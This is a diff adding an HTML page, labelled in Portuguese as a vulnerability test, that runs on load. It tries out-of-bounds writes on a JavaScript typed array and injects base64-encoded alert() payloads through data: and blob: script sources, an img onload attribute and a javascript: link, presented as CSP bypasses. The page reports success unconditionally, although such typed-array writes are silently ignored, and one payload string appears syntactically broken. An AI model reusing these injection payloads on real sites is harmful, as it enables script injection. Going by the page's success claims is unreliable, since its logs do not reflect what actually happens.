@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <title>Vulnerability Test Script</title>
+    <style>
+        body {
+            font-family: monospace;
+            white-space: pre-wrap;
+        }
+
+        #output {
+            margin-top: 20px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            background-color: #f8f8f8;
+        }
+
+        .critical {
+            color: magenta;
+            font-weight: bold;
+        }
+
+        .warning {
+            color: orange;
+        }
+
+        .success {
+            color: green;
+        }
+
+        .error {
+            color: red;
+        }
+
+        .info {
+            color: blue;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>Vulnerability Test Script</h1>
+    <div id="output"></div>
+
+    <script>
+        const log = (message, type = 'info') => {
+            const outputDiv = document.getElementById('output');
+            outputDiv.innerHTML += `<span class="${type}">${new Date().toLocaleTimeString()} - ${message}\n</span>`;
+        };
+
+        async function vulnerabilityTest() {
+            log("Iniciando Teste de Vulnerabilidades Combinado (OOB Write e CSP Bypass)", 'critical');
+
+            // ====================== Fase 1: Teste de OOB Write ======================
+            log("\nFase 1: Teste de OOB Write", 'warning');
+            await testOOBWrite();
+
+            // ====================== Fase 2: Teste de CSP Bypass ======================
+            log("\nFase 2: Teste de CSP Bypass", 'warning');
+            await testCSPBypass();
+
+            // ====================== Fase 3: Teste Combinado ======================
+            log("\nFase 3: Teste Combinado (OOB Write + CSP Bypass)", 'warning');
+            await testCombinedExploit();
+
+            log("\nTeste de Vulnerabilidades Concluído. Consulte os logs para obter detalhes.", 'critical');
+        }
+
+        async function testOOBWrite() {
+            log("\nIniciando Teste de OOB Write...", 'info');
+
+            const bufferSize = 64;
+            const buffer = new ArrayBuffer(bufferSize);
+            const view = new Uint8Array(buffer);
+            const writeOffsets = [-1, 0, bufferSize - 1, bufferSize, bufferSize + 1, bufferSize + 8];
+            const writeValue = 0xAA;
+
+            for (const offset of writeOffsets) {
+                try {
+                    log(`  Tentando escrever 0x${writeValue.toString(16)} no offset ${offset}...`, 'info');
+                    view[offset] = writeValue;
+                    log(`  Escrita no offset ${offset} bem-sucedida.`, 'success');
+
+                    // Leitura para verificar o efeito
+                    for (let i = -1; i <= bufferSize + 1; i++) {
+                        try {
+                            const readValue = view[i];
+                            log(`    Leitura no offset ${i}: 0x${readValue.toString(16)}`, 'info');
+                        } catch (readError) {
+                            log(`    Erro ao ler no offset ${i}: ${readError.message}`, 'error');
+                        }
+                    }
+
+                } catch (error) {
+                    log(`  Erro ao escrever no offset ${offset}: ${error.message}`, 'error');
+                }
+            }
+
+            log("Teste de OOB Write Concluído.", 'info');
+        }
+
+        async function testCSPBypass() {
+            log("\nIniciando Teste de CSP Bypass...", 'info');
+
+            const cspBypassAttempts = [{
+                    type: 'data_uri',
+                    code: 'YWxlcnQoIlZQdW4gYmF5cGFzcyBkbyBDU1AhIik7' // alert("Vupun bypass do CSP!")
+                },
+                {
+                    type: 'blob_uri',
+                    code: 'YWxlcnQoIlZQdW4gYmxvYiBieXBhc3MhIik7' // alert("Vupun blob bypass!")
+                },
+                {
+                    type: 'event_attribute',
+                    element: 'img',
+                    event: 'onload',
+                    code: 'YWxlcnQoIlZQdW4gb25sb2FkIGJ5cGFzcyEiKTs=' // alert("Vupun onload bypass!")
+                },
+                {
+                    type: 'javascript_uri',
+                    element: 'a',
+                    uri: 'javascript:alert(\\'Vupun javascript bypass!\\');',
+                    text: 'Clique aqui para bypassar CSP'
+                }
+            ];
+
+            for (const attempt of cspBypassAttempts) {
+                try {
+                    if (attempt.type === 'data_uri') {
+                        const script = document.createElement('script');
+                        script.src = 'data:text/javascript;base64,' + attempt.code;
+                        document.body.appendChild(script);
+                        log(`  Tentativa de bypass via data: URI...`, 'info');
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+
+                    } else if (attempt.type === 'blob_uri') {
+                        const code = atob(attempt.code);
+                        const blob = new Blob([code], {
+                            type: 'text/javascript'
+                        });
+                        const url = URL.createObjectURL(blob);
+                        const script = document.createElement('script');
+                        script.src = url;
+                        document.body.appendChild(script);
+                        log(`  Tentativa de bypass via blob: URI...`, 'info');
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+
+                    } else if (attempt.type === 'event_attribute') {
+                        const element = document.createElement(attempt.element);
+                        element.setAttribute(attempt.event, atob(attempt.code));
+                        if (attempt.element === 'img') {
+                            element.src = 'invalid-image.jpg'; // Forçar o evento
+                        }
+                        document.body.appendChild(element);
+                        log(`  Tentativa de bypass via atributo ${attempt.event} em ${attempt.element}...`, 'info');
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+
+                    } else if (attempt.type === 'javascript_uri') {
+                        const link = document.createElement(attempt.element);
+                        link.href = attempt.uri;
+                        link.textContent = attempt.text;
+                        document.body.appendChild(link);
+                        log(`  Tentativa de bypass via javascript: URI em ${attempt.element}...`, 'info');
+                        // Neste caso, requer interação do usuário
+                    }
+
+                    log(`  Bypass de CSP via ${attempt.type} bem-sucedido (verifique os alertas).`, 'success');
+
+                } catch (error) {
+                    log(`  Falha ao tentar bypass de CSP via ${attempt.type}: ${error.message}`, 'error');
+                }
+            }
+
+            log("Teste de CSP Bypass Concluído.", 'info');
+        }
+
+        async function testCombinedExploit() {
+            log("\nIniciando Teste Combinado (OOB Write + CSP Bypass)", 'info');
+
+            // Passo 1: OOB Write (Simulação de Corrupção)
+            log("\nPasso 1: Tentativa de OOB Write para Corrupção", 'info');
+            try {
+                const bufferSize = 64;
+                const buffer = new ArrayBuffer(bufferSize);
+                const view = new Uint8Array(buffer);
+                const writeOffset = bufferSize + 4; // Fora do limite
+                const writeValue = 0x41; // "A"
+
+                view[writeOffset] = writeValue;
+                log(`  Tentativa de OOB Write bem-sucedida (offset ${writeOffset}).`, 'success');
+
+            } catch (error) {
+                log(`  Falha na tentativa de OOB Write: ${error.message}`, 'error');
+                return; // Se o OOB Write falhar, não continue
+            }
+
+            // Passo 2: CSP Bypass (Execução de Código Arbitrário)
+            log("\nPasso 2: Tentativa de Bypass de CSP após OOB Write", 'info');
+            try {
+                const script = document.createElement('script');
+                script.src = 'data:text/javascript;base64,YWxlcnQoIlZQdW4gY29tYm8hIik7'; // alert("Vupun combo!")
+                document.body.appendChild(script);
+                log(`  Bypass de CSP bem-sucedido via data: URI (após OOB Write).`, 'success');
+
+            } catch (error) {
+                log(`  Falha no Bypass de CSP após OOB Write: ${error.message}`, 'error');
+            }
+
+            log("Teste Combinado Concluído.", 'info');
+        }
+
+        document.addEventListener('DOMContentLoaded', vulnerabilityTest);
+    </script>
+</body>
+
+</html>
